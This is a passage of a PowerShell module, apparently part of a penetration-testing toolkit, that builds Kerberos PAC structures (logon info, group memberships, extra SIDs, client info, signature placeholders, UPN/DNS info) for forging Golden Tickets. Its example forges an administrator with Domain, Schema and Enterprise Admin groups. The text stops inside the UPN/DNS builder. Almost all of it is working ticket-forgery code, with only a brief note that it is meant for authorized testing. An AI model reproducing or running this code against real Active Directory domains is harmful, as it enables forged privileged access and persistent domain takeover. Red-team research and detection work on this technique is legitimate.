<#
.SYNOPSIS
    PAC (Privilege Attribute Certificate) structure builder for Kerberos Golden Tickets.

.DESCRIPTION
    This module provides functions to construct PAC structures required for Golden Ticket creation.
    The PAC is embedded in Kerberos tickets and contains authorization data including:
    - User SID and group memberships
    - Logon information (account name, domain, etc.)
    - PAC signatures (server and KDC checksums)

    Structures implemented (per MS-PAC specification):
    - KERB_VALIDATION_INFO: User account information and group memberships
    - PAC_INFO_BUFFER: PAC buffer descriptor
    - PAC_SIGNATURE_DATA: PAC checksums
    - PAC_CLIENT_INFO: Client name and time
    - PACTYPE: Overall PAC structure

.NOTES
    Author: Alexander Sturz (@_61106960_)

    References:
    - [MS-PAC]: Privilege Attribute Certificate Data Structure
    - [MS-KILE]: Kerberos Protocol Extensions
    - [MS-RPCE]: Remote Procedure Call Protocol Extensions

    Security Note:
    This module is intended for authorized security testing and research only.
    Golden Ticket creation requires the krbtgt key which is only available through:
    - Legitimate administrative access
    - Prior security testing (with proper authorization)
#>

# ============================================================================
# PAC Constants (MS-PAC Section 2.4)
# ============================================================================

# PAC_INFO_BUFFER ulType values
$Script:PAC_LOGON_INFO = 1                    # KERB_VALIDATION_INFO
$Script:PAC_CREDENTIALS_INFO = 2              # PAC_CREDENTIAL_INFO (NTLM supplemental credentials)
$Script:PAC_SERVER_CHECKSUM = 6               # PAC_SIGNATURE_DATA (server)
$Script:PAC_PRIVSVR_CHECKSUM = 7              # PAC_SIGNATURE_DATA (KDC)
$Script:PAC_CLIENT_INFO_TYPE = 10             # PAC_CLIENT_INFO
$Script:PAC_DELEGATION_INFO = 11              # S4U_DELEGATION_INFO
$Script:PAC_UPN_DNS_INFO = 12                 # UPN_DNS_INFO
$Script:PAC_CLIENT_CLAIMS_INFO = 13           # PAC_CLIENT_CLAIMS_INFO
$Script:PAC_DEVICE_INFO = 14                  # PAC_DEVICE_INFO
$Script:PAC_DEVICE_CLAIMS_INFO = 15           # PAC_DEVICE_CLAIMS_INFO
$Script:PAC_TICKET_CHECKSUM = 16              # PAC_SIGNATURE_DATA (ticket)
$Script:PAC_ATTRIBUTES_INFO = 17              # PAC_ATTRIBUTES_INFO
$Script:PAC_REQUESTOR = 18                    # PAC_REQUESTOR
$Script:PAC_FULL_CHECKSUM = 19                # PAC_SIGNATURE_DATA (full PAC)

# Signature algorithm types
$Script:KERB_CHECKSUM_HMAC_MD5 = -138         # 0xFFFFFF76 (RC4-HMAC)
$Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 = 15
$Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 = 16

# User Account Control flags (MS-SAMR 2.2.1.13)
$Script:USER_ACCOUNT_DISABLED = 0x00000001
$Script:USER_HOME_DIRECTORY_REQUIRED = 0x00000002
$Script:USER_PASSWORD_NOT_REQUIRED = 0x00000004
$Script:USER_TEMP_DUPLICATE_ACCOUNT = 0x00000008
$Script:USER_NORMAL_ACCOUNT = 0x00000010
$Script:USER_MNS_LOGON_ACCOUNT = 0x00000020
$Script:USER_INTERDOMAIN_TRUST_ACCOUNT = 0x00000040
$Script:USER_WORKSTATION_TRUST_ACCOUNT = 0x00000080
$Script:USER_SERVER_TRUST_ACCOUNT = 0x00000100
$Script:USER_DONT_EXPIRE_PASSWORD = 0x00000200
$Script:USER_ACCOUNT_AUTO_LOCKED = 0x00000400
$Script:USER_ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000800
$Script:USER_SMARTCARD_REQUIRED = 0x00001000
$Script:USER_TRUSTED_FOR_DELEGATION = 0x00002000
$Script:USER_NOT_DELEGATED = 0x00004000
$Script:USER_USE_DES_KEY_ONLY = 0x00008000
$Script:USER_DONT_REQUIRE_PREAUTH = 0x00010000
$Script:USER_PASSWORD_EXPIRED = 0x00020000
$Script:USER_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x00040000
$Script:USER_NO_AUTH_DATA_REQUIRED = 0x00080000
$Script:USER_PARTIAL_SECRETS_ACCOUNT = 0x00100000

# Group attributes (MS-PAC 2.2.1.4)
$Script:SE_GROUP_MANDATORY = 0x00000001
$Script:SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
$Script:SE_GROUP_ENABLED = 0x00000004
$Script:SE_GROUP_OWNER = 0x00000008
$Script:SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010
$Script:SE_GROUP_RESOURCE = 0x20000000
$Script:SE_GROUP_LOGON_ID = 0xC0000000

# Default group attributes for standard group membership
$Script:DEFAULT_GROUP_ATTRIBUTES = $Script:SE_GROUP_MANDATORY -bor $Script:SE_GROUP_ENABLED_BY_DEFAULT -bor $Script:SE_GROUP_ENABLED

# Well-known RIDs
$Script:DOMAIN_GROUP_RID_USERS = 513
$Script:DOMAIN_GROUP_RID_ADMINS = 512
$Script:DOMAIN_GROUP_RID_COMPUTERS = 515
$Script:DOMAIN_GROUP_RID_CONTROLLERS = 516
$Script:DOMAIN_GROUP_RID_ENTERPRISE_ADMINS = 519
$Script:DOMAIN_GROUP_RID_SCHEMA_ADMINS = 518

# ============================================================================
# Helper Functions for Binary Encoding
# ============================================================================

function ConvertTo-FlatByteArray {
    <#
    .SYNOPSIS
        Recursively flattens a nested array structure into a single byte array.
    .DESCRIPTION
        PowerShell's += operator on arrays creates Object[] instead of byte[].
        This function properly flattens nested arrays into a single byte[].
    #>
    [CmdletBinding()]
    param($InputArray)

    $result = [System.Collections.Generic.List[byte]]::new()

    foreach ($item in $InputArray) {
        if ($null -eq $item) { continue }

        if ($item -is [byte]) {
            $result.Add($item)
        }
        elseif ($item -is [array]) {
            # Recursively flatten nested arrays
            $flattened = ConvertTo-FlatByteArray -InputArray $item
            if ($flattened -and $flattened.Count -gt 0) {
                $result.AddRange([byte[]]$flattened)
            }
        }
        else {
            # Try to cast to byte
            $result.Add([byte]$item)
        }
    }

    return [byte[]]$result.ToArray()
}

function Write-UInt16LE {
    <#
    .SYNOPSIS
        Writes a 16-bit unsigned integer in little-endian format.
    #>
    [CmdletBinding()]
    param([uint16]$Value)

    return [byte[]]@(
        ($Value -band 0xFF),
        (($Value -shr 8) -band 0xFF)
    )
}

function Write-UInt32LE {
    <#
    .SYNOPSIS
        Writes a 32-bit unsigned integer in little-endian format.
    #>
    [CmdletBinding()]
    param([uint32]$Value)

    return [byte[]]@(
        ($Value -band 0xFF),
        (($Value -shr 8) -band 0xFF),
        (($Value -shr 16) -band 0xFF),
        (($Value -shr 24) -band 0xFF)
    )
}

function Write-Int32LE {
    <#
    .SYNOPSIS
        Writes a 32-bit signed integer in little-endian format.
    #>
    [CmdletBinding()]
    param([int32]$Value)

    $bytes = [BitConverter]::GetBytes($Value)
    if (-not [BitConverter]::IsLittleEndian) {
        [Array]::Reverse($bytes)
    }
    return [byte[]]$bytes
}

function Write-UInt64LE {
    <#
    .SYNOPSIS
        Writes a 64-bit unsigned integer in little-endian format.
    #>
    [CmdletBinding()]
    param([uint64]$Value)

    $bytes = [BitConverter]::GetBytes($Value)
    if (-not [BitConverter]::IsLittleEndian) {
        [Array]::Reverse($bytes)
    }
    return [byte[]]$bytes
}

function Write-Int64LE {
    <#
    .SYNOPSIS
        Writes a 64-bit signed integer in little-endian format.
    #>
    [CmdletBinding()]
    param([int64]$Value)

    $bytes = [BitConverter]::GetBytes($Value)
    if (-not [BitConverter]::IsLittleEndian) {
        [Array]::Reverse($bytes)
    }
    return [byte[]]$bytes
}

function ConvertTo-FileTime {
    <#
    .SYNOPSIS
        Converts a DateTime to Windows FILETIME format.
    #>
    [CmdletBinding()]
    param([datetime]$DateTime)

    return $DateTime.ToFileTimeUtc()
}

function Write-UnicodeStringRPC {
    <#
    .SYNOPSIS
        Writes a RPC_UNICODE_STRING structure (MS-RPCE 2.3.10).
    .DESCRIPTION
        RPC_UNICODE_STRING:
        - Length (2 bytes): Length of string in bytes (not including null)
        - MaximumLength (2 bytes): Maximum length in bytes (Length + 2 for null terminator like Rubeus)
        - Buffer (4 bytes): Pointer to string data (NDR unique pointer)

        Rubeus always allocates a pointer for strings, even empty ones.
        For empty strings: Length=0, MaxLen=0, but Pointer is still valid.
    #>
    [CmdletBinding()]
    param(
        [string]$Value,
        [uint32]$PointerId
    )

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Value)
    $length = [uint16]$bytes.Length

    # For empty strings, still use the pointer (Rubeus behavior)
    # Length=0, MaxLen=0, but pointer is valid
    if ($length -eq 0) {
        $result = @()
        $result += Write-UInt16LE -Value 0        # Length = 0
        $result += Write-UInt16LE -Value 0        # MaximumLength = 0
        $result += Write-UInt32LE -Value $PointerId  # Valid pointer (Rubeus uses this)
        return ConvertTo-FlatByteArray $result
    }

    # MaximumLength = Length + 2 (for null terminator) like Rubeus
    $maxLength = [uint16]($bytes.Length + 2)

    $result = @()
    $result += Write-UInt16LE -Value $length
    $result += Write-UInt16LE -Value $maxLength
    $result += Write-UInt32LE -Value $PointerId  # Unique pointer

    return ConvertTo-FlatByteArray $result
}

function Write-UnicodeStringData {
    <#
    .SYNOPSIS
        Writes the actual Unicode string data for NDR marshaling.
    .DESCRIPTION
        NDR conformant varying array for string:
        - MaximumCount (4 bytes): Maximum elements
        - Offset (4 bytes): Offset to first element
        - ActualCount (4 bytes): Actual number of elements
        - Data: Unicode characters (2 bytes each)
        - Padding to 4-byte boundary
    #>
    [CmdletBinding()]
    param([string]$Value)

    $result = @()
    $charCount = $Value.Length

    # NDR conformant varying array header
    # For empty strings: MaximumCount = 0 (like Rubeus)
    # For non-empty strings: MaximumCount = charCount + 1 (include null terminator like Rubeus)
    if ($charCount -eq 0) {
        $maxCount = 0
    } else {
        $maxCount = $charCount + 1
    }
    $result += Write-UInt32LE -Value $maxCount  # MaximumCount
    $result += Write-UInt32LE -Value 0          # Offset
    $result += Write-UInt32LE -Value $charCount # ActualCount (actual chars, no null)

    # Unicode string data
    $result += [System.Text.Encoding]::Unicode.GetBytes($Value)

    # Pad to 4-byte boundary
    $totalLen = 12 + ($charCount * 2)
    $padding = (4 - ($totalLen % 4)) % 4
    if ($padding -gt 0) {
        $result += [byte[]]::new($padding)
    }

    return ConvertTo-FlatByteArray $result
}

function ConvertFrom-SIDString {
    <#
    .SYNOPSIS
        Converts a SID string (S-1-5-21-xxx-xxx-xxx-xxx) to binary format.
    #>
    [CmdletBinding()]
    param([string]$SIDString)

    try {
        $sid = New-Object System.Security.Principal.SecurityIdentifier($SIDString)
        $bytes = [byte[]]::new($sid.BinaryLength)
        $sid.GetBinaryForm($bytes, 0)
        return $bytes
    }
    catch {
        Write-Log "[ConvertFrom-SIDString] Failed to parse SID: $SIDString - $_" -Level Error
        return $null
    }
}

function Get-DomainSIDFromUserSID {
    <#
    .SYNOPSIS
        Extracts the domain SID from a user/group SID.
    .DESCRIPTION
        User SID: S-1-5-21-xxx-xxx-xxx-1234
        Domain SID: S-1-5-21-xxx-xxx-xxx
    #>
    [CmdletBinding()]
    param([string]$UserSID)

    $parts = $UserSID -split '-'
    if ($parts.Count -ge 5) {
        # Remove the last component (RID)
        return ($parts[0..($parts.Count - 2)]) -join '-'
    }
    return $UserSID
}

function Write-SIDNDR {
    <#
    .SYNOPSIS
        Writes a SID in NDR format for RPC marshaling.
    .DESCRIPTION
        NDR SID structure:
        - Revision (1 byte)
        - SubAuthorityCount (1 byte)
        - IdentifierAuthority (6 bytes)
        - SubAuthority array (4 bytes each)
    #>
    [CmdletBinding()]
    param([string]$SIDString)

    $sidBytes = ConvertFrom-SIDString -SIDString $SIDString
    if (-not $sidBytes) {
        return [byte[]]@()
    }

    # NDR pointer to SID (conformant array)
    $subAuthCount = $sidBytes[1]
    $result = @()

    # MaximumCount for conformant array
    $result += Write-UInt32LE -Value $subAuthCount

    # SID binary data
    $result += $sidBytes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# GROUP_MEMBERSHIP Structure (MS-PAC 2.2.2)
# ============================================================================

function New-GroupMembership {
    <#
    .SYNOPSIS
        Creates a GROUP_MEMBERSHIP structure.
    .DESCRIPTION
        GROUP_MEMBERSHIP:
        - RelativeId (4 bytes): RID of the group
        - Attributes (4 bytes): Group attributes (SE_GROUP_*)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [uint32]$RelativeId,

        [Parameter(Mandatory=$false)]
        [uint32]$Attributes = $Script:DEFAULT_GROUP_ATTRIBUTES
    )

    $result = @()
    $result += Write-UInt32LE -Value $RelativeId
    $result += Write-UInt32LE -Value $Attributes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# KERB_SID_AND_ATTRIBUTES Structure (MS-PAC 2.2.1)
# ============================================================================

function New-SidAndAttributes {
    <#
    .SYNOPSIS
        Creates a KERB_SID_AND_ATTRIBUTES structure for extra SIDs.
    .DESCRIPTION
        KERB_SID_AND_ATTRIBUTES:
        - Sid (pointer): PISID - pointer to SID
        - Attributes (4 bytes): Group attributes
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SID,

        [Parameter(Mandatory=$false)]
        [uint32]$Attributes = $Script:DEFAULT_GROUP_ATTRIBUTES,

        [Parameter(Mandatory=$true)]
        [uint32]$PointerId
    )

    $result = @()
    $result += Write-UInt32LE -Value $PointerId    # Pointer to SID
    $result += Write-UInt32LE -Value $Attributes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# KERB_VALIDATION_INFO Structure (MS-PAC 2.5)
# ============================================================================

function Build-KerbValidationInfo {
    <#
    .SYNOPSIS
        Builds a KERB_VALIDATION_INFO structure for PAC.

    .DESCRIPTION
        Creates the primary authorization data structure containing:
        - User logon information (name, domain, SID, etc.)
        - Group memberships (primary group and additional groups)
        - Logon times and session information
        - User account control flags

        This structure is the core of the PAC and determines the user's
        effective permissions in the domain.

    .PARAMETER UserName
        The sAMAccountName of the user.

    .PARAMETER Domain
        The NetBIOS domain name (e.g., "CONTOSO").

    .PARAMETER DomainSID
        The domain SID string (e.g., "S-1-5-21-xxx-xxx-xxx").

    .PARAMETER UserRID
        The user's relative identifier (RID).

    .PARAMETER PrimaryGroupRID
        The user's primary group RID (default: 513 - Domain Users).

    .PARAMETER GroupRIDs
        Array of additional group RIDs the user belongs to.
        Default includes Domain Users (513).

    .PARAMETER ExtraSIDs
        Array of extra SIDs for cross-domain/universal group membership.
        These can include SIDs from other domains.

    .PARAMETER LogonTime
        The time of logon (default: current time).

    .PARAMETER LogoffTime
        The time of logoff (default: never - max FILETIME).

    .PARAMETER UserAccountControl
        UAC flags for the account (default: NORMAL_ACCOUNT).

    .EXAMPLE
        $validationInfo = Build-KerbValidationInfo -UserName "administrator" `
            -Domain "CONTOSO" -DomainSID "S-1-5-21-xxx-xxx-xxx" `
            -UserRID 500 -GroupRIDs @(512, 513, 518, 519, 520)

    .NOTES
        The NDR marshaling follows MS-RPCE conventions with proper pointer handling.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID,

        [Parameter(Mandatory=$false)]
        [uint32]$PrimaryGroupRID = $Script:DOMAIN_GROUP_RID_USERS,

        [Parameter(Mandatory=$false)]
        [uint32[]]$GroupRIDs = @($Script:DOMAIN_GROUP_RID_USERS),

        [Parameter(Mandatory=$false)]
        [string[]]$ExtraSIDs = @(),

        [Parameter(Mandatory=$false)]
        [datetime]$LogonTime,

        [Parameter(Mandatory=$false)]
        [datetime]$LogoffTime,

        [Parameter(Mandatory=$false)]
        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT
    )

    # Set default times (use NEVER = 0x7FFFFFFFFFFFFFFF for most times like Rubeus)
    if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }

    # NEVER times - using the raw FILETIME value that Rubeus uses
    # This is 0x7FFFFFFFFFFFFFFF in little-endian
    $NEVER_TIME = [int64]0x7FFFFFFFFFFFFFFF

    # NDR pointer IDs (unique pointers, must not collide with top-level referent 0x00020000)
    # Pointer IDs are incremented by 4 (not 1) to maintain 4-byte alignment
    $ptrId = 0x00020004
    $ptrIdStep = 4

    # NDR type serialization header (MS-RPCE 2.2.6)
    # This header is required for the LOGON_INFO buffer
    $ndrHeader = @()

    # Common Type Header (8 bytes)
    $ndrHeader += [byte]0x01           # Version
    $ndrHeader += [byte]0x10           # Endianness (little-endian)
    $ndrHeader += Write-UInt16LE -Value 8   # CommonHeaderLength
    $ndrHeader += [byte[]]@(0xCC, 0xCC, 0xCC, 0xCC)  # Filler

    # Private Header (8 bytes) - ObjectBufferLength filled later
    # Patched after we know the total payload size (at offset 8 in header)
    $ndrHeader += Write-UInt32LE -Value 0  # ObjectBufferLength (patched later)
    $ndrHeader += [byte[]]@(0x00, 0x00, 0x00, 0x00)  # Filler

    # Top-level unique pointer referent ID
    $ndrHeader += Write-UInt32LE -Value 0x00020000

    # Build the fixed part of KERB_VALIDATION_INFO
    $fixedPart = @()

    # LogonTime (FILETIME)
    $fixedPart += Write-Int64LE -Value (ConvertTo-FileTime -DateTime $LogonTime)

    # LogoffTime (FILETIME) - NEVER like Rubeus
    $fixedPart += Write-Int64LE -Value $NEVER_TIME

    # KickOffTime (FILETIME) - NEVER like Rubeus
    $fixedPart += Write-Int64LE -Value $NEVER_TIME

    # PasswordLastSet (FILETIME) - NEVER like Rubeus
    $fixedPart += Write-Int64LE -Value $NEVER_TIME

    # PasswordCanChange (FILETIME) - NEVER like Rubeus
    $fixedPart += Write-Int64LE -Value $NEVER_TIME

    # PasswordMustChange (FILETIME) - NEVER like Rubeus
    $fixedPart += Write-Int64LE -Value $NEVER_TIME

    # EffectiveName (RPC_UNICODE_STRING)
    $ptrEffectiveName = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $UserName -PointerId $ptrEffectiveName

    # FullName (RPC_UNICODE_STRING) - empty, but Rubeus still allocates a pointer
    $ptrFullName = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrFullName

    # LogonScript (RPC_UNICODE_STRING) - empty
    $ptrLogonScript = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrLogonScript

    # ProfilePath (RPC_UNICODE_STRING) - empty
    $ptrProfilePath = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrProfilePath

    # HomeDirectory (RPC_UNICODE_STRING) - empty
    $ptrHomeDir = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrHomeDir

    # HomeDirectoryDrive (RPC_UNICODE_STRING) - empty
    $ptrHomeDirDrive = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrHomeDirDrive

    # LogonCount (USHORT) - Rubeus uses 0
    $fixedPart += Write-UInt16LE -Value 0

    # BadPasswordCount (USHORT)
    $fixedPart += Write-UInt16LE -Value 0

    # UserId (ULONG) - User RID
    $fixedPart += Write-UInt32LE -Value $UserRID

    # PrimaryGroupId (ULONG)
    $fixedPart += Write-UInt32LE -Value $PrimaryGroupRID

    # GroupCount (ULONG)
    $groupCount = if ($null -eq $GroupRIDs) { 0 } else { @($GroupRIDs).Count }
    Write-Verbose "[Build-KerbValidationInfo] GroupRIDs=$($GroupRIDs -join ','), groupCount=$groupCount, ptrId=0x$($ptrId.ToString('X8'))"
    $fixedPart += Write-UInt32LE -Value $groupCount

    # GroupIds (pointer to GROUP_MEMBERSHIP array)
    if ($groupCount -gt 0) {
        $ptrGroups = $ptrId
        $ptrId += $ptrIdStep
    } else {
        $ptrGroups = 0
    }
    Write-Verbose "[Build-KerbValidationInfo] ptrGroups=0x$($ptrGroups.ToString('X8'))"
    $fixedPart += Write-UInt32LE -Value $ptrGroups

    # UserFlags (ULONG) - LOGON_EXTRA_SIDS if we have extra SIDs
    $userFlags = 0
    if ($ExtraSIDs.Count -gt 0) {
        $userFlags = 0x20  # LOGON_EXTRA_SIDS
    }
    $fixedPart += Write-UInt32LE -Value $userFlags

    # UserSessionKey (USER_SESSION_KEY - 16 bytes, all zeros)
    $fixedPart += [byte[]]::new(16)

    # LogonServer (RPC_UNICODE_STRING) - empty like Rubeus
    $ptrLogonServer = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrLogonServer

    # LogonDomainName (RPC_UNICODE_STRING)
    $ptrLogonDomain = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $Domain.ToUpper() -PointerId $ptrLogonDomain

    # LogonDomainId (PISID - pointer to SID)
    $ptrDomainSid = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UInt32LE -Value $ptrDomainSid

    # Reserved1 (2 ULONGs)
    $fixedPart += Write-UInt32LE -Value 0
    $fixedPart += Write-UInt32LE -Value 0

    # UserAccountControl (ULONG)
    $fixedPart += Write-UInt32LE -Value $UserAccountControl

    # SubAuthStatus (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # LastSuccessfulILogon (FILETIME)
    $fixedPart += Write-Int64LE -Value 0

    # LastFailedILogon (FILETIME)
    $fixedPart += Write-Int64LE -Value 0

    # FailedILogonCount (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # Reserved3 (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # SidCount (ULONG)
    $sidCount = $ExtraSIDs.Count
    $fixedPart += Write-UInt32LE -Value $sidCount

    # ExtraSids (pointer to KERB_SID_AND_ATTRIBUTES array)
    # Rubeus allocates a pointer even when SidCount = 0
    $ptrExtraSids = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UInt32LE -Value $ptrExtraSids

    # ResourceGroupDomainSid (PISID - NULL, no resource groups)
    # Rubeus uses NULL here when no resource groups are present
    $fixedPart += Write-UInt32LE -Value 0

    # ResourceGroupCount (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # ResourceGroupIds (pointer - null, no resource groups)
    $fixedPart += Write-UInt32LE -Value 0

    # Build referent data (strings, SIDs, arrays pointed to by the structure)
    # CRITICAL: Referent data must appear in the SAME ORDER as pointer declarations!
    # Rubeus allocates pointers for ALL strings, even empty ones, and includes their referent data
    # Order: EffectiveName, FullName, LogonScript, ProfilePath, HomeDir, HomeDirDrive,
    #        GroupIds, LogonServer, LogonDomainName, LogonDomainId, ExtraSids
    $referentData = @()

    # EffectiveName string data
    $referentData += Write-UnicodeStringData -Value $UserName

    # FullName string data (empty - referent data is just MaxCount=0, Offset=0, ActualCount=0)
    $referentData += Write-UnicodeStringData -Value ""

    # LogonScript string data (empty)
    $referentData += Write-UnicodeStringData -Value ""

    # ProfilePath string data (empty)
    $referentData += Write-UnicodeStringData -Value ""

    # HomeDirectory string data (empty)
    $referentData += Write-UnicodeStringData -Value ""

    # HomeDirectoryDrive string data (empty)
    $referentData += Write-UnicodeStringData -Value ""

    # GroupIds array (if present)
    if ($groupCount -gt 0) {
        # NDR conformant array: MaximumCount
        $referentData += Write-UInt32LE -Value $groupCount

        foreach ($rid in $GroupRIDs) {
            $referentData += New-GroupMembership -RelativeId $rid
        }
    }

    # LogonServer string data (empty like Rubeus)
    $referentData += Write-UnicodeStringData -Value ""

    # LogonDomainName string data
    $referentData += Write-UnicodeStringData -Value $Domain.ToUpper()

    # LogonDomainId SID data
    $referentData += Write-SIDNDR -SIDString $DomainSID

    # ExtraSids referent data
    # Rubeus always includes referent data for the ExtraSids pointer
    if ($sidCount -gt 0) {
        # NDR conformant array: MaximumCount
        $referentData += Write-UInt32LE -Value $sidCount

        # First, write the KERB_SID_AND_ATTRIBUTES array (pointers + attributes)
        $sidPtrId = $ptrId
        foreach ($extraSid in $ExtraSIDs) {
            $referentData += New-SidAndAttributes -SID $extraSid -PointerId $sidPtrId
            $sidPtrId += $ptrIdStep
        }

        # Then, write the actual SID data for each
        foreach ($extraSid in $ExtraSIDs) {
            $referentData += Write-SIDNDR -SIDString $extraSid
        }
    } else {
        # Empty ExtraSids: write 8 null bytes as empty referent data (like Rubeus)
        $referentData += [byte[]]@(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    }

    # Combine fixed part and referent data into the payload
    $payload = ConvertTo-FlatByteArray ($fixedPart + $referentData)

    # Patch the ObjectBufferLength in the private header
    # Rubeus includes the 4-byte top-level referent ID in the ObjectBufferLength
    $ndrHeaderBytes = ConvertTo-FlatByteArray $ndrHeader
    $objectBufferLength = $payload.Length + 4  # +4 for top-level referent ID (like Rubeus)
    $lengthBytes = [BitConverter]::GetBytes([uint32]$objectBufferLength)
    [Array]::Copy($lengthBytes, 0, $ndrHeaderBytes, 8, 4)

    # Combine NDR header + payload
    return ($ndrHeaderBytes + $payload)
}

# ============================================================================
# PAC_CLIENT_INFO Structure (MS-PAC 2.7)
# ============================================================================

function Build-PACClientInfo {
    <#
    .SYNOPSIS
        Builds a PAC_CLIENT_INFO structure.
    .DESCRIPTION
        PAC_CLIENT_INFO:
        - ClientId (FILETIME): Time when AS request was received
        - NameLength (USHORT): Length of Name in bytes
        - Name (variable): Client name in Unicode
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$false)]
        [datetime]$ClientId
    )

    if (-not $ClientId) { $ClientId = [datetime]::UtcNow }

    $nameBytes = [System.Text.Encoding]::Unicode.GetBytes($ClientName)

    $result = @()
    $result += Write-Int64LE -Value (ConvertTo-FileTime -DateTime $ClientId)
    $result += Write-UInt16LE -Value $nameBytes.Length
    $result += $nameBytes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_SIGNATURE_DATA Structure (MS-PAC 2.8)
# ============================================================================

function Build-PACSignature {
    <#
    .SYNOPSIS
        Builds a PAC_SIGNATURE_DATA structure with zeroed signature.
    .DESCRIPTION
        PAC_SIGNATURE_DATA (as used by Kerberos implementations):
        - SignatureType (LONG): Checksum algorithm
        - Signature (variable): The signature bytes (zeroed for later calculation)

        Note: RODCIdentifier is NOT included - it is only present in PACs
        generated by Read-Only Domain Controllers.

    .PARAMETER SignatureType
        The checksum algorithm:
        - -138 (HMAC_MD5) for RC4-HMAC
        - 16 (HMAC_SHA1_96_AES256) for AES256
        - 15 (HMAC_SHA1_96_AES128) for AES128

    .NOTES
        The signature is initially zeroed and must be computed after
        the entire PAC is assembled.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$SignatureType
    )

    $result = @()

    # SignatureType (4 bytes, signed)
    $result += Write-Int32LE -Value $SignatureType

    # Signature (variable length based on type)
    $sigLength = switch ($SignatureType) {
        $Script:KERB_CHECKSUM_HMAC_MD5 { 16 }             # HMAC-MD5: 16 bytes
        $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 { 12 }  # HMAC-SHA1-96: 12 bytes
        $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 { 12 }  # HMAC-SHA1-96: 12 bytes
        default { 16 }
    }

    $result += [byte[]]::new($sigLength)  # Zeroed signature placeholder

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_INFO_BUFFER Structure (MS-PAC 2.3)
# ============================================================================

function New-PACInfoBuffer {
    <#
    .SYNOPSIS
        Creates a PAC_INFO_BUFFER descriptor.
    .DESCRIPTION
        PAC_INFO_BUFFER:
        - ulType (ULONG): Type of buffer (PAC_LOGON_INFO, etc.)
        - cbBufferSize (ULONG): Size of buffer data
        - Offset (ULONGLONG): Offset to buffer data from start of PAC
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [uint32]$Type,

        [Parameter(Mandatory=$true)]
        [uint32]$Size,

        [Parameter(Mandatory=$true)]
        [uint64]$Offset
    )

    $result = @()
    $result += Write-UInt32LE -Value $Type
    $result += Write-UInt32LE -Value $Size
    $result += Write-UInt64LE -Value $Offset

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_UPN_DNS_INFO Builder (MS-PAC 2.10)
# ============================================================================

function Build-PACUpnDnsInfo {
    <#
    .SYNOPSIS
        Builds a PAC_UPN_DNS_INFO structure from scratch.
    .DESCRIPTION
        PAC_UPN_DNS_INFO contains:
        - UPN (user principal name)
        - DNS domain name
        - Flags (0x01 = UPN_CONSTRUCTED - matches Rubeus format)

        Note: We use Flags=0x01 (UPN_CONSTRUCTED) without EXTENDED data
        to match Rubeus behavior. EXTENDED (0x02) format with SamName/SID
        is used by real KDC but can cause issues with some implementations.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$DnsDomainName,

        [Parameter(Mandatory=$true)]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID
    )

    $upn = "$UserName@$($DnsDomainName.ToLowerInvariant())"
    $upnBytes = [System.Text.Encoding]::Unicode.GetBytes($upn)
    $dnsBytes = [System.Text.Encoding]::Unicode.GetBytes($DnsDomainName.ToUpperInvariant())

    # Use UPN_CONSTRUCTED flag (0x01) like Rubeus - simpler format without SamName/SID
    # MS-PAC 2.10: Flag 0x01 = S flag (UPN constructed from sAMAccountName and dnsDomainName)
    # Rubeus adds 4 bytes padding after Flags, making header 16 bytes
    $flags = [uint32]0x01
    $headerSize = 16  # 2+2+2+2+4+4(padding) = 16 bytes (like Rubeus)
    $upnOffset = $headerSize
    $dnsOffset = $upnOffset + $upnBytes.Length

    $result = @()
    $result += Write-UInt16LE -Value $upnBytes.Length        # UPN Length
    $result += Write-UInt16LE -Value $upnOffset              # UPN Offset
